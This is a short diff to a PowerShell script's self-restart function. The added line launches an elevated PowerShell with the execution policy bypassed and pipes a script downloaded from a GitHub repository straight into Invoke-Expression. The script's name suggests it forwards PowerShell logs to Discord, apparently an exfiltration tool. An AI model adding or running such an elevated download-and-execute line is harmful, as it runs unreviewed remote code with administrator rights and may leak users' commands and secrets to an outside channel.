@@ -39,9 +39,8 @@ Function RestartScript{
         Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
     }
     else{
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C ") -Verb RunAs
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Discord%20Scripts/Global-PS-Logging-to-DC.ps1 | iex") -Verb RunAs
     }
-
     exit
 }
 
